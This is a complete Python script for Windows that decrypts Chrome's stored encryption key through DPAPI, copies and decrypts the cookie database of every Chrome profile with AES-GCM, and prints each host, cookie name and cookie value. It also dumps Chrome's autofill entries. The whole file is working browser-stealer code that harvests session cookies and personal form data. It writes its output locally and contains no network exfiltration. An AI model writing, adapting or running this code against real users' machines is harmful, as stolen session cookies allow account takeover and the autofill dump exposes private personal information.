import os
import sqlite3
import json
import base64
from shutil import copy2
import win32crypt
from Cryptodome.Cipher import AES

def get_chrome_data():
    # Chrome Paths (Windows)
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data'
    local_state_path = os.path.join(data_path, "Local State")
    profiles = [dir for dir in os.listdir(data_path) if "Profile" in dir or "Default" in dir]

    # Decrypt encryption key
    with open(local_state_path, "r") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    # Process cookies
    for profile in profiles:
        cookie_path = os.path.join(data_path, profile, 'Network', 'Cookies')
        temp_cookie_db = "temp_cookies.db"
        
        try:
            copy2(cookie_path, temp_cookie_db)
            conn = sqlite3.connect(temp_cookie_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            for host, name, encrypted_value in cursor.fetchall():
                if encrypted_value[:3] == b'v10':
                    nonce, ciphertext, tag = encrypted_value[3:15], encrypted_value[15:-16], encrypted_value[-16:]
                    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                    print(f"Cookie: {host} | {name} = {decrypted.decode()}")
                else:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value)[1]
                    print(f"Cookie: {host} | {name} = {decrypted.decode()}")
            
            conn.close()
            os.remove(temp_cookie_db)
        except Exception as e:
            print(f"Error processing cookies: {e}")

def get_autofill_data():
    # Chrome Autofill Extraction
    try:
        web_data_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                    r'Google\Chrome\User Data\Default\Web Data')
        temp_web_data = "temp_web_data.db"
        copy2(web_data_path, temp_web_data)
        
        conn = sqlite3.connect(temp_web_data)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        
        for name, value in cursor.fetchall():
            print(f"Autofill Entry: {name} = {value}")
        
        conn.close()
        os.remove(temp_web_data)
    except Exception as e:
        print(f"Autofill Error: {e}")

if __name__ == "__main__":
    get_chrome_data()
    get_autofill_data()
